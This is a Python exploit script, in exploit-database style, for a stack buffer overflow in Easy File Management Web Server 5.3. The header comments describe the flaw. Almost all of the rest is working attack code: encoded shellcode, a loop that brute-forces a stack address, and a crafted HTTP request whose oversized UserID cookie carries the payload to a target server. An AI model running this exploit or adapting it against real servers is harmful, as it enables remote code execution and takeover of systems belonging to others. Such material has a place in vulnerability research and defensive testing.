#!/usr/bin/env python
 
# Exploit Title: Easy File Management Web Server 5.3 stack buffer overflow
# Date: 19 May 2014
# Exploit Author: superkojiman - http://www.techorganic.com
# Vendor Homepage: http://www.efssoft.com
# Software Link: http://www.web-file-management.com/download.php
# Version: 5.3
# Tested on: English version of Windows XP Professional SP2 and SP3
#
# Description:
# By setting UserID in the cookie to a long string, we can overwrite EDX which
# allows us to control execution flow when the following instruction is
# executed:
#
# 0x00468702: call dword ptr [edx+28h]
#
# Very similar to Easy File Sharing Web Server 6.8 exploit here:
# http://www.exploit-db.com/exploits/33352/
# I suspect their other web server solutions might be vulnerable to a similar
# overflow.
#
# Tested with Easy File Management Web Server installed in the default location
# at C:\EFS Software\Easy File Management Web Server
 
 
import socket
import struct
import sys
 
target = "www.example.com"
port = 80
 
# calc shellcode from https://code.google.com/p/win-exec-calc-shellcode/
# msfencode -b "\x00\x20" -i w32-exec-calc-shellcode.bin
# [*] x86/shikata_ga_nai succeeded with size 101 (iteration=1)
shellcode = (
"\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9" +
"\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56" +
"\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9" +
"\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97" +
"\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64" +
"\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8" +
"\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a" +
"\x1c\x39\xbd"
)
 
for i in xrange(1,255):
    n = ""
    if i < 16:
        n = "0" + hex(i)[-1]
    else:
        n = hex(i)[2:]
 
    # craft the value of EDX that will be used in CALL DWORD PTR DS:[EDX+28]
    # only second byte changes in the stack address changes, so we can brute
    # force it
    guess = "0x01" + n + "9898"
    print "trying", guess
 
    payload =  "A"*20                               # padding
    payload += struct.pack("<I", 0x1001646a)        # call edi @LoadImage.dll
    payload += "B"*56                               # padding
    payload += struct.pack("<I", int(guess, 16))    # guessed address in stack
                                                    # containing pointer to
                                                    # call edi
 
    payload += "\x90"*20                            # nop sled
    payload += shellcode                            # win!
 
    # craft the request
    buf = (
    "GET /vfolder.ghp HTTP/1.1\r\n"
    "User-Agent: Mozilla/4.0\r\n"
    "Host:" + target + ":" + str(port) + "\r\n"
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    "Accept-Language: en-us\r\n"
    "Accept-Encoding: gzip, deflate\r\n"
    "Referer: http://" + target + "/\r\n"
    "Cookie: SESSIONID=6771; UserID=" + payload + "; PassWD=;\r\n"
    "Conection: Keep-Alive\r\n\r\n"
    )
 
    # send the request and payload to the server
    s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s1.connect((target, port))
    s1.send(buf)
    s1.close()
